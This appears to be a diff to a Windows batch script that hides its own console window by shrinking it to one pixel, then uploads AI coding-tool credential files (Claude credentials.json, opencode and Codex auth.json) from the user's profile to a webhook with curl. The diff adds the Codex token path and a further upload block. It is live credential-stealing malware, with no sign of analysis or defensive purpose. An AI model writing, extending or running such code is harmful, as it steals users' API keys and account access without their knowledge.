@@ -1,5 +1,6 @@
 powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
 @echo off
+set "FILEEEE=%userprofile%\.codex\auth.json"
 set "FILEEE=%userprofile%\.claude\credentials.json"
 set "FILEE=%userprofile%\.claude\.credentials.json"
 set "FILE=%userprofile%\.local\share\opencode\auth.json"
@@ -18,6 +19,12 @@ json\n\"}" ^
 curl -F "file=@%FILEE%" %WEBHOOK%
 )
 if exist "%FILEEE%" (
+curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
+json\n\"}" ^
+    %WEBHOOK%
+curl -F "file=@%FILEEE%" %WEBHOOK%
+)
+if exist "%FILEEEE%" (
 curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
 json\n\"}" ^
     %WEBHOOK%
